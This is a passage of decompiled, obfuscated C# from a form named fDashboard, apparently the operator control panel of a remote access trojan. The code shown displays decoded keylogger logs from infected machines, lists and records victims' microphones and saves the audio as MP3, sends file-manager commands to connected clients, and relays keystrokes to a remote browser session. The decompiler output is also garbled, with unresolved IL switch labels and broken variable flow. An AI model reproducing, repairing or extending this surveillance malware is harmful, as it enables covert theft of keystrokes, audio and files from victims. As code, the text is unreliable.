						if (Class135.smethod_0().ConKlgColors)
						{
							IL_21E:
							num2 = 33;
							if (this.stringBuilder_0.Length > 0)
							{
								IL_22F:
								num2 = 34;
								this.method_91("\r\n\r\n");
							}
						}
						IL_23D:
						num2 = 35;
						if (Class135.smethod_0().ConKlgColors)
						{
							IL_24C:
							num2 = 36;
							this.method_90(text3, Color.Green);
						}
						IL_25C:
						num2 = 37;
						if (Class135.smethod_0().ConKlgColors)
						{
							IL_26B:
							num2 = 38;
							string string_ = " [" + text2 + "]\r\n";
							IL_280:
							num2 = 39;
							this.method_90(string_, Color.DeepSkyBlue);
						}
					}
					IL_290:
					num2 = 40;
					this.stringBuilder_0.Append(text4);
					IL_2A1:
					num2 = 41;
					if (Class135.smethod_0().ConKlgColors)
					{
						IL_2B0:
						num2 = 42;
						this.method_91(text4);
					}
					IL_2BB:
					num2 = 43;
					long num3;
					num3 += 1L;
					IL_2CC:
					num2 = 44;
					this.vmethod_282().ReportProgress((int)Math.Round(Conversion.Val(unchecked((double)num3 / (double)elementsByTagName.Count * 100.0))));
					IL_300:
					num2 = 45;
				}
				IL_30E:
				num2 = 46;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
				IL_324:
				goto IL_434;
				IL_329:;
			}
			int num4 = num5 + 1;
			num5 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
			IL_3F3:
			goto IL_429;
			IL_3F5:
			num5 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_406:;
		}
		catch when (endfilter(obj2 is Exception & num != 0 & num5 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_3F5;
		}
		IL_429:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_434:
		if (num5 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x060008B7 RID: 2231 RVA: 0x000444B4 File Offset: 0x000426B4
	public void method_90(string string_12, Color color_0)
	{
		if (this.vmethod_280().InvokeRequired)
		{
			this.vmethod_280().Invoke(new fDashboard.Delegate37(this.method_90), new object[]
			{
				string_12,
				color_0
			});
			return;
		}
		this.vmethod_280().Enabled = true;
		this.vmethod_280().ReadOnly = true;
		this.vmethod_280().SelectionColor = color_0;
		this.vmethod_280().AppendText(string_12);
		this.vmethod_280().SelectionColor = Color.Black;
	}

	// Token: 0x060008B8 RID: 2232 RVA: 0x0004453C File Offset: 0x0004273C
	public void method_91(string string_12)
	{
		if (this.vmethod_280().InvokeRequired)
		{
			this.vmethod_280().Invoke(new fDashboard.Delegate28(this.method_91), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_280().Enabled = true;
		this.vmethod_280().ReadOnly = true;
		this.vmethod_280().AppendText(string_12);
	}

	// Token: 0x060008B9 RID: 2233 RVA: 0x000445A0 File Offset: 0x000427A0
	private void method_92(object sender, ProgressChangedEventArgs e)
	{
		if (e.ProgressPercentage > this.vmethod_492().Value)
		{
			this.vmethod_492().Value = e.ProgressPercentage;
			this.vmethod_290().Value = e.ProgressPercentage;
			this.vmethod_290().Update();
		}
	}

	// Token: 0x060008BA RID: 2234 RVA: 0x000445F0 File Offset: 0x000427F0
	private void method_93(object sender, RunWorkerCompletedEventArgs e)
	{
		this.vmethod_492().Value = 0;
		ToolStripStatusLabel toolStripStatusLabel = this.vmethod_486();
		int num = (this.stringBuilder_0.Length > 0) ? 1 : 0;
		string text = "Current log size: ";
		double num2 = (double)this.stringBuilder_0.Length;
		bool flag = false;
		ref bool ptr = ref flag;
		double num3 = num2;
		string str = text;
		int num4 = num;
		ToolStripStatusLabel toolStripStatusLabel2 = toolStripStatusLabel;
		int num5;
		string text3;
		int num6;
		object obj;
		try
		{
			ProjectData.ClearProjectError();
			num5 = 2;
			string text2 = string.Empty;
			if (num3 >= 1099511627776.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
			}
			else if (num3 >= 1073741824.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
			}
			else if (num3 >= 1048576.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
			}
			else if (num3 >= 1024.0)
			{
				text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
			}
			else if (num3 < 1024.0)
			{
				text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
			}
			if (ptr)
			{
				text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
			}
			if (text2.Length > 0)
			{
				text3 = text2;
			}
			else
			{
				text3 = " 0 B";
			}
			IL_1AC:
			goto IL_1FB;
			IL_1AE:
			text3 = "0 B";
			goto IL_1AC;
			IL_1B6:
			num6 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num5);
			IL_1CC:;
		}
		catch when (endfilter(obj is Exception & num5 != 0 & num6 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_1B6;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_1FB:
		if (num6 != 0)
		{
			ProjectData.ClearProjectError();
		}
		string str2 = text3;
		ToolStripStatusLabel toolStripStatusLabel3 = toolStripStatusLabel2;
		int num7 = num4;
		string text4 = str + str2;
		string text5 = "Current lize: ";
		double num8 = 0.0;
		flag = false;
		ptr = ref flag;
		num3 = num8;
		string str3 = text5;
		string truePart = text4;
		int expression = num7;
		ToolStripStatusLabel toolStripStatusLabel4 = toolStripStatusLabel3;
		object obj3;
		try
		{
			ProjectData.ClearProjectError();
			num5 = 2;
			string text2 = string.Empty;
			if (num3 >= 1099511627776.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
			}
			else if (num3 >= 1073741824.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
			}
			else if (num3 >= 1048576.0)
			{
				text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
			}
			else if (num3 >= 1024.0)
			{
				text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
			}
			else if (num3 < 1024.0)
			{
				text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
			}
			if (ptr)
			{
				text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
			}
			if (text2.Length > 0)
			{
				text3 = text2;
			}
			else
			{
				text3 = " 0 B";
			}
			IL_39F:
			goto IL_3EE;
			IL_3A1:
			text3 = "0 B";
			goto IL_39F;
			IL_3A9:
			num6 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num5);
			IL_3BF:;
		}
		catch when (endfilter(obj3 is Exception & num5 != 0 & num6 == 0))
		{
			Exception ex2 = (Exception)obj4;
			goto IL_3A9;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_3EE:
		if (num6 != 0)
		{
			ProjectData.ClearProjectError();
		}
		string str4 = text3;
		toolStripStatusLabel4.Text = Conversions.ToString(Operators.ConcatenateObject(Interaction.IIf(expression != 0, truePart, str3 + str4), " (decoded)"));
		if (this.stringBuilder_0.Length == 0)
		{
			this.stringBuilder_0.Clear();
			this.stringBuilder_0.Append("No logs available!");
		}
		this.vmethod_556().Visible = false;
		this.vmethod_556().SendToBack();
		this.vmethod_280().Enabled = true;
		this.vmethod_388().Enabled = true;
		this.vmethod_704().Enabled = true;
		this.vmethod_712().Enabled = true;
		this.vmethod_702().Enabled = true;
		this.vmethod_290().Visible = false;
		this.vmethod_290().Value = 0;
		this.vmethod_492().Value = 0;
		this.vmethod_488().Text = Conversions.ToString(Interaction.IIf(this.string_10 == null, "Creation date: N/A", "Creation date: " + this.string_10));
		this.vmethod_490().Text = Conversions.ToString(Interaction.IIf(this.string_11 == null, "Last updated: N/A", "Last updated: " + this.string_11));
		if (this.string_10 != null && (this.string_11.Length > 0 & this.string_11.Length > 0))
		{
			if (Operators.CompareString(Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0], Strings.Split(this.string_11, " ", -1, CompareMethod.Text)[0], true) != 0)
			{
				this.vmethod_386().Text = "Current log: " + Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0] + " to " + Strings.Split(this.string_11, " ", -1, CompareMethod.Text)[0];
			}
			else
			{
				this.vmethod_386().Text = "Current log: " + Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0];
			}
		}
		this.vmethod_280().Enabled = true;
		this.vmethod_280().ReadOnly = true;
		if (!Class135.smethod_0().ConKlgColors)
		{
			this.vmethod_280().Text = this.stringBuilder_0.ToString();
		}
	}

	// Token: 0x060008BB RID: 2235 RVA: 0x00044C60 File Offset: 0x00042E60
	private void method_94(object sender, EventArgs e)
	{
		this.vmethod_288().Tag = Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_288().Tag)) + 1.0;
		this.vmethod_478().Text = "Duration: " + Class136.smethod_35(checked((long)Math.Round(Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_288().Tag)))), true);
	}

	// Token: 0x060008BC RID: 2236 RVA: 0x00044CD4 File Offset: 0x00042ED4
	public void method_95(ref string string_12)
	{
		if (this.vmethod_280().InvokeRequired)
		{
			this.vmethod_280().Invoke(new fDashboard.Delegate3(this.method_95), new object[]
			{
				string_12
			});
			return;
		}
		if (Operators.CompareString(string_12, "0", true) != 0)
		{
			this.vmethod_388().SelectedItems.Clear();
			this.vmethod_388().Items[string_12].BackColor = Color.Red;
		}
		this.vmethod_556().Visible = false;
		this.vmethod_556().SendToBack();
		this.vmethod_280().Enabled = true;
		this.vmethod_388().Enabled = true;
		this.vmethod_712().Enabled = true;
		this.vmethod_702().Enabled = true;
		this.vmethod_704().Enabled = true;
	}

	// Token: 0x060008BD RID: 2237 RVA: 0x00044DA0 File Offset: 0x00042FA0
	public void method_96(ref string string_12)
	{
		if (this.vmethod_326().InvokeRequired)
		{
			this.vmethod_326().Invoke(new fDashboard.Delegate16(this.method_96), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_326().Items.Clear();
		this.vmethod_694().Enabled = true;
		if (Operators.CompareString(string_12, "0", true) == 0)
		{
			this.vmethod_326().Enabled = false;
			this.vmethod_304().Enabled = false;
			this.vmethod_320().Enabled = false;
			this.vmethod_692().Enabled = false;
			this.vmethod_330().Enabled = false;
			Interaction.MsgBox("No audio input device found!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string[] array = Strings.Split(string_12, "@", -1, CompareMethod.Text);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (array[i].Length > 0)
				{
					this.vmethod_326().Items.Add(array[i]);
				}
			}
			this.vmethod_326().Enabled = true;
			this.vmethod_326().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_326().Items[0]);
			this.vmethod_304().Enabled = true;
			this.vmethod_320().Enabled = true;
			this.vmethod_692().Enabled = true;
			this.vmethod_330().Enabled = true;
		}
	}

	// Token: 0x060008BE RID: 2238 RVA: 0x00044EF8 File Offset: 0x000430F8
	public void method_97()
	{
		if (this.vmethod_708().InvokeRequired)
		{
			this.vmethod_708().Invoke(new fDashboard.Delegate27(this.method_97), new object[0]);
			return;
		}
		this.vmethod_708().Text = "Start";
		this.vmethod_708().Refresh();
		this.vmethod_708().Enabled = true;
	}

	// Token: 0x060008BF RID: 2239 RVA: 0x00044F58 File Offset: 0x00043158
	public void method_98(ref string string_12)
	{
		if (this.vmethod_466().InvokeRequired)
		{
			this.vmethod_466().Invoke(new fDashboard.Delegate22(this.method_98), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_466().ReadOnly = true;
		this.vmethod_466().AppendText(string_12 + "\r\n");
		this.vmethod_466().SelectionStart = Strings.Len(this.vmethod_466().Text);
		this.vmethod_466().ScrollToCaret();
	}

	// Token: 0x060008C0 RID: 2240 RVA: 0x00044FE0 File Offset: 0x000431E0
	public void method_99(ref string string_12)
	{
		if (this.vmethod_466().InvokeRequired)
		{
			this.vmethod_466().Invoke(new fDashboard.Delegate10(this.method_99), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_466().ReadOnly = true;
		this.vmethod_466().AppendText(string_12 + "\r\n");
		this.vmethod_708().Enabled = true;
	}

	// Token: 0x060008C1 RID: 2241 RVA: 0x00045050 File Offset: 0x00043250
	public void method_100(ref string string_12)
	{
		if (this.vmethod_286().InvokeRequired)
		{
			this.vmethod_286().Invoke(new fDashboard.Delegate8(this.method_100), new object[]
			{
				string_12
			});
			return;
		}
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.LoadXml("<root>" + string_12 + "</root>");
		XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("block");
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			foreach (object obj in elementsByTagName)
			{
				XmlNode xmlNode = (XmlNode)obj;
				XmlNode xmlNode2 = xmlNode.SelectSingleNode("title");
				XmlNode xmlNode3 = xmlNode.SelectSingleNode("date");
				XmlNode xmlNode4 = xmlNode.SelectSingleNode("data");
				string text = string.Empty;
				string text2 = string.Empty;
				string text3 = string.Empty;
				if (xmlNode2 != null)
				{
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode2.InnerText));
					text2 = this.method_102(ref @string);
				}
				if (xmlNode3 != null)
				{
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode3.InnerText));
					text = this.method_102(ref @string);
				}
				if (xmlNode4 != null)
				{
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode4.InnerText));
					text3 = this.method_102(ref @string);
				}
				if (Strings.Len(text2) > 0)
				{
					if (this.bool_1)
					{
						this.bool_1 = false;
					}
					else if (Class135.smethod_0().ConKlgColors)
					{
						this.vmethod_286().Enabled = true;
						this.vmethod_286().ReadOnly = true;
						this.vmethod_286().AppendText("\r\n\r\n");
						if (this.bool_2)
						{
							this.fKeylogOnline_0.vmethod_0().Enabled = true;
							this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
							this.fKeylogOnline_0.vmethod_0().AppendText("\r\n\r\n");
						}
					}
					else
					{
						stringBuilder.Append("\r\n\r\n");
					}
					if (Class135.smethod_0().ConKlgColors)
					{
						this.vmethod_286().Enabled = true;
						this.vmethod_286().ReadOnly = true;
						this.vmethod_286().SelectionColor = Color.Green;
						this.vmethod_286().AppendText(text2);
						this.vmethod_286().SelectionColor = Color.Black;
						if (this.bool_2)
						{
							this.fKeylogOnline_0.vmethod_0().Enabled = true;
							this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
							this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Green;
							this.fKeylogOnline_0.vmethod_0().AppendText(text2);
							this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Black;
						}
						string text4 = " [" + text + "]\r\n";
						this.vmethod_286().Enabled = true;
						this.vmethod_286().ReadOnly = true;
						this.vmethod_286().SelectionColor = Color.DeepSkyBlue;
						this.vmethod_286().AppendText(text4);
						this.vmethod_286().SelectionColor = Color.Black;
						if (this.bool_2)
						{
							this.fKeylogOnline_0.vmethod_0().Enabled = true;
							this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
							this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.DeepSkyBlue;
							this.fKeylogOnline_0.vmethod_0().AppendText(text4);
							this.fKeylogOnline_0.vmethod_0().SelectionColor = Color.Black;
						}
					}
					else
					{
						stringBuilder.Append(text2 + " [" + text + "]\r\n");
					}
				}
				stringBuilder.Append(text3);
				if (Class135.smethod_0().ConKlgColors)
				{
					this.vmethod_286().AppendText(text3);
					if (this.bool_2)
					{
						this.fKeylogOnline_0.vmethod_0().AppendText(text3);
					}
				}
				else
				{
					this.vmethod_286().AppendText(stringBuilder.ToString());
					if (this.bool_2)
					{
						this.fKeylogOnline_0.vmethod_0().AppendText(stringBuilder.ToString());
					}
				}
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x060008C2 RID: 2242 RVA: 0x00045458 File Offset: 0x00043658
	public void method_101(ref bool bool_3)
	{
		if (this.vmethod_706().InvokeRequired)
		{
			this.vmethod_706().Invoke(new fDashboard.Delegate38(this.method_101), new object[]
			{
				bool_3
			});
			return;
		}
		if (bool_3)
		{
			this.bool_1 = true;
			this.vmethod_480().Text = "Status: Enabled";
			this.vmethod_286().Enabled = true;
			this.vmethod_286().BackColor = Color.White;
			this.vmethod_286().ReadOnly = true;
			if (this.bool_2)
			{
				this.fKeylogOnline_0.vmethod_0().Enabled = true;
				this.fKeylogOnline_0.vmethod_0().BackColor = Color.White;
				this.fKeylogOnline_0.vmethod_0().ReadOnly = true;
			}
			this.vmethod_706().Text = "Stop";
			this.vmethod_288().Tag = null;
			this.vmethod_288().Enabled = true;
		}
		else
		{
			this.vmethod_706().Text = "Start";
			this.vmethod_480().Text = "Status: Disabled";
			this.vmethod_478().Text = "Duration: N/A";
			this.vmethod_286().Clear();
			this.vmethod_286().Enabled = false;
			if (this.bool_2)
			{
				this.fKeylogOnline_0.vmethod_0().Clear();
				this.fKeylogOnline_0.vmethod_0().Enabled = false;
			}
			this.vmethod_288().Enabled = false;
		}
		this.vmethod_706().Enabled = true;
	}

	// Token: 0x060008C3 RID: 2243 RVA: 0x000455D4 File Offset: 0x000437D4
	private string method_102(ref string string_12)
	{
		int num;
		string result;
		int num2;
		object obj;
		try
		{
			ProjectData.ClearProjectError();
			num = 2;
			result = string_12;
			IL_0A:
			goto IL_55;
			IL_0C:
			result = string.Empty;
			goto IL_0A;
			IL_14:
			num2 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_28:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num2 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_14;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_55:
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	// Token: 0x060008C4 RID: 2244 RVA: 0x00045650 File Offset: 0x00043850
	private void method_103(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("Enter new folder name", Application.ProductName, string.Empty, -1, -1);
		if (Operators.CompareString(text, string.Empty, true) == 0)
		{
			Interaction.MsgBox("Invalid folder name!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		int num = 0;
		ref int ptr = ref num;
		ref string ptr2 = ref text;
		string text2 = string.Empty;
		string fileName = Path.GetFileName(ptr2);
		text2 = Path.GetDirectoryName(ptr2);
		bool flag;
		if (!Information.IsNothing(ptr))
		{
			IEnumerable<char> source = fileName.Intersect(Path.GetInvalidFileNameChars());
			if (source.Any<char>())
			{
				ptr = checked(Strings.Len(text2) + fileName.IndexOf(source.First<char>()));
				flag = false;
			}
			else
			{
				source = text2.Intersect(Path.GetInvalidPathChars());
				if (source.Any<char>())
				{
					ptr = text2.IndexOf(source.First<char>());
					flag = false;
				}
				else
				{
					flag = true;
				}
			}
		}
		else
		{
			flag = (!fileName.Intersect(Path.GetInvalidFileNameChars()).Any<char>() && !text2.Intersect(Path.GetInvalidPathChars()).Any<char>());
		}
		if (flag)
		{
			string str = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			string key;
			CClient value = concurrentDictionary_[key = this.string_4];
			string text3 = "files_new_dir|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(str + "\\" + text));
			long num2 = 0L;
			ref string ptr3 = ref text3;
			ref CClient ptr4 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr3 += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr3);
				ptr4.sock_async.method_6(bytes);
				CClient cclient = ptr4;
				ref double ptr5 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr5 + (double)ptr3.Length;
				ptr5 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr5 + (double)ptr3.Length;
				ptr5 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr5 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			return;
		}
		Interaction.MsgBox("Invalid folder name!", MsgBoxStyle.Exclamation, Application.ProductName);
	}

	// Token: 0x060008C5 RID: 2245 RVA: 0x0000681B File Offset: 0x00004A1B
	private void method_104(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 7;
		this.method_41();
	}

	// Token: 0x060008C6 RID: 2246 RVA: 0x0000682F File Offset: 0x00004A2F
	private void method_105(object sender, EventArgs e)
	{
		this.vmethod_316().Items.Clear();
		this.concurrentStack_1.Clear();
		this.concurrentStack_2.Clear();
	}

	// Token: 0x060008C7 RID: 2247 RVA: 0x000458AC File Offset: 0x00043AAC
	private void method_106(object sender, EventArgs e)
	{
		checked
		{
			if (this.concurrentStack_1.Count > 0 & this.vmethod_316().SelectedItems.Count > 0)
			{
				MemoryStream memoryStream = new MemoryStream();
				GClass7 gclass = this.vmethod_316();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						long num2 = unchecked((long)i);
						IL_6A:
						int num3 = gclass.Items.Count - 1;
						for (int j = 0; j <= num3; j++)
						{
							if (gclass.Items[j].Selected)
							{
								byte[] array = new byte[(int)(this.concurrentStack_1.ElementAtOrDefault(j).Length - 1L) + 1];
								if (this.concurrentStack_2.ElementAtOrDefault(j).SampleRate != this.concurrentStack_2.ElementAtOrDefault((int)num2).SampleRate)
								{
									Interaction.MsgBox("Playback of mixed sample rates not supported.\r\nPlease, select matching sample rates.", MsgBoxStyle.Exclamation, Application.ProductName);
									return;
								}
								this.concurrentStack_1.ElementAtOrDefault(j).Position = 0L;
								this.concurrentStack_1.ElementAtOrDefault(j).Read(array, 0, (int)this.concurrentStack_1.ElementAtOrDefault(j).Length);
								memoryStream.Write(array, 0, array.Length);
							}
						}
						RawSourceWaveStream rawSourceWaveStream_ = new RawSourceWaveStream(memoryStream, this.concurrentStack_2.ElementAtOrDefault((int)num2));
						this.method_116(rawSourceWaveStream_);
						return;
					}
				}
				goto IL_6A;
			}
		}
	}

	// Token: 0x060008C8 RID: 2248 RVA: 0x00045A2C File Offset: 0x00043C2C
	private void method_107(object sender, EventArgs e)
	{
		checked
		{
			if (this.concurrentStack_1.Count > 0 & this.vmethod_316().SelectedItems.Count > 0)
			{
				MemoryStream memoryStream = new MemoryStream();
				GClass7 gclass = this.vmethod_316();
				int num = gclass.Items.Count - 1;
				int i = 0;
				while (i <= num)
				{
					if (!gclass.Items[i].Selected)
					{
						i++;
					}
					else
					{
						long num2 = unchecked((long)i);
						IL_6A:
						int num3 = gclass.Items.Count - 1;
						for (int j = 0; j <= num3; j++)
						{
							if (gclass.Items[j].Selected)
							{
								byte[] array = new byte[(int)(this.concurrentStack_1.ElementAtOrDefault(j).Length - 1L) + 1];
								if (this.concurrentStack_2.ElementAtOrDefault(j).SampleRate != this.concurrentStack_2.ElementAtOrDefault((int)num2).SampleRate)
								{
									Interaction.MsgBox("Mixed sample rates not supported.\r\nPlease, select matching sample rates.", MsgBoxStyle.Exclamation, Application.ProductName);
									return;
								}
								this.concurrentStack_1.ElementAtOrDefault(j).Position = 0L;
								this.concurrentStack_1.ElementAtOrDefault(j).Read(array, 0, (int)this.concurrentStack_1.ElementAtOrDefault(j).Length);
								memoryStream.Write(array, 0, array.Length);
							}
						}
						this.vmethod_340().Filter = "Wav Files (*.wav*)|*.wav";
						this.vmethod_340().FilterIndex = 1;
						this.vmethod_340().RestoreDirectory = true;
						if (this.vmethod_340().ShowDialog() == DialogResult.OK)
						{
							LameMP3FileWriter lameMP3FileWriter = new LameMP3FileWriter(this.vmethod_340().FileName, this.concurrentStack_2.ElementAtOrDefault((int)num2), 128, null);
							byte[] array2 = this.method_108(ref memoryStream);
							lameMP3FileWriter.Write(array2.ToArray<byte>(), 0, array2.Length);
							lameMP3FileWriter.Flush();
							lameMP3FileWriter.Close();
							return;
						}
						return;
					}
				}
				goto IL_6A;
			}
		}
	}

	// Token: 0x060008C9 RID: 2249 RVA: 0x00045C10 File Offset: 0x00043E10
	public byte[] method_108(ref MemoryStream memoryStream_0)
	{
		MemoryStream memoryStream = new MemoryStream();
		WaveFileReader waveFileReader = new WaveFileReader(memoryStream_0);
		LameMP3FileWriter destination = new LameMP3FileWriter(memoryStream, waveFileReader.WaveFormat, 128, null);
		waveFileReader.CopyTo(destination);
		waveFileReader.Flush();
		waveFileReader.Close();
		return memoryStream.ToArray();
	}

	// Token: 0x060008CA RID: 2250 RVA: 0x00045C58 File Offset: 0x00043E58
	private void method_109(object sender, EventArgs e)
	{
		this.vmethod_310().Text = "Samples: " + Conversions.ToString(this.vmethod_316().Items.Count);
		GClass7 gclass = this.vmethod_316();
		checked
		{
			long num2;
			if (gclass.Items.Count > 0)
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						num2 += 1L;
					}
				}
			}
			this.vmethod_312().Text = "Selected: " + Conversions.ToString(num2);
			if (Strings.Len(RuntimeHelpers.GetObjectValue(this.vmethod_342().Tag)) > 0)
			{
				this.vmethod_314().Text = "Duration: " + Class136.smethod_35((long)Math.Round(unchecked((double)Class136.smethod_36() - Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_342().Tag))) / 1000.0), true);
				return;
			}
			this.vmethod_314().Text = "Duration: N/A";
		}
	}

	// Token: 0x060008CB RID: 2251 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_110(object sender, EventArgs e)
	{
	}

	// Token: 0x060008CC RID: 2252 RVA: 0x00045D6C File Offset: 0x00043F6C
	private void fDashboard_KeyPress(object sender, KeyPressEventArgs e)
	{
		int selectedIndex = this.vmethod_18().SelectedIndex;
		if (selectedIndex != 1)
		{
			if (selectedIndex != 11)
			{
				return;
			}
			int num = Strings.Asc(e.KeyChar);
			string text2;
			string text3;
			Class136.Class138 @class;
			switch (num)
			{
			case 33:
			{
				string text = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex)
				{
				}
				return;
			}
			case 34:
			{
				string text4 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text4;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
				return;
			}
			case 35:
			{
				string text5 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text5;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex3)
				{
				}
				return;
			}
			case 36:
			{
				string text6 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text6;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex4)
				{
				}
				return;
			}
			case 37:
			{
				string text7 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text7;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex5)
				{
				}
				return;
			}
			case 38:
			{
				string text8 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text8;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex6)
				{
				}
				return;
			}
			case 39:
			{
				string text9 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text9;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex7)
				{
				}
				return;
			}
			case 40:
			{
				string text10 = this.string_4;
				text2 = "remotebrowser_key|0|" + Conversions.ToString(Strings.Asc(e.KeyChar));
				text3 = text10;
				@class = new Class136.Class138();
				@class.string_0 = text3;
				@class.string_1 = text2;
				@class.long_0 = 0L;
				try
